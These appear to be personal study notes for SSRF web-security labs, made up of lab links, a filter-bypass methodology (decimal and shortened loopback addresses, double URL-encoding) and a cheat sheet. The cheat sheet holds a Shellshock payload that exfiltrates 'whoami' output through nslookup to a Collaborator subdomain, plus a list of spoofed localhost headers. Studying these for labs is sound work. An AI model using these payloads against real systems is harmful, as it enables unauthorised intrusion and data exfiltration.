# SSRF - CHEATSHEET + MOST IMPORTANT LABS

## Key terms

```bash
loopback network interface
```

## Walkthrough - Most Important Labs

- [SSRF via arbitraty host + EXTRA lab: absolute path](../Host-Header-Injection/SSRF-via-arbitraryhost-and-absolute-path.md)

- [SSRF-via-host-validation-bypass-via-connection-state-attack](../Host-Header-Injection/SSRF-via-host-validation-bypass-via-connection-state-attack.md) ❗

- [SSRF filter bypass](ssrf-bypasas-filter.md)


## Methodology

```bash
- Server send any http request? -> SSRF
	  -> localhost/foo -> blacklisted?
					   -> send in decimal -> https://www.ipaddressguide.com/ip
					   -> 127.1 = 127.0.0.1
					   -> 127.255.255.255
						   -> /foo -> url encode all characters x2 times, example ->   http://127.1/%2561%2564%256d%2569%256e
		
	  -> Intruder x.x.x.x:xxxxx/foo to scan internal network
- Switch protocol (http/https)	  
- Search open redirect -> in url?
- Refer to our server -> User Agent? -> shellshock
- XML? -> try XXE  

```




## Cheat Sheet

```
() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN```
```

Localhost bypass
```bash
X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-For: localhost
X-Forward-For: localhost
X-Remote-IP: localhost
X-Client-IP: localhost
X-Real-IP: localhost

X-Originating-IP: 127.0.0.1
X-Forwarded: 127.0.0.1
Forwarded-For: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
X-Original-URL: 127.0.0.1
Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Cluster-Client-IP: 127.0.0.1
```